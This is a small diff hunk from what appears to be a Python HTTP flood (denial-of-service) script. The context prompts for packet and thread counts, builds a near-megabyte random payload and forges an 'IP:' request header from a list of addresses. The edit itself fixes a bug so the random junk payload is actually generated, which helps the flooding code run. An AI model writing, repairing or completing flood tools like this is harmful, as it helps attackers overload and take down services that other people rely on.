@@ -83,7 +83,7 @@ pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
 def start():
   global userip
-  hh = random.urandom(999999)
+  hh = random._urandom(999999)
   xx = int(0)
   ipser = "IP: "+random.choice(userip)+"\r\n"
   content    = "Content-Type: application/x-www-form-urlencoded\r\n"
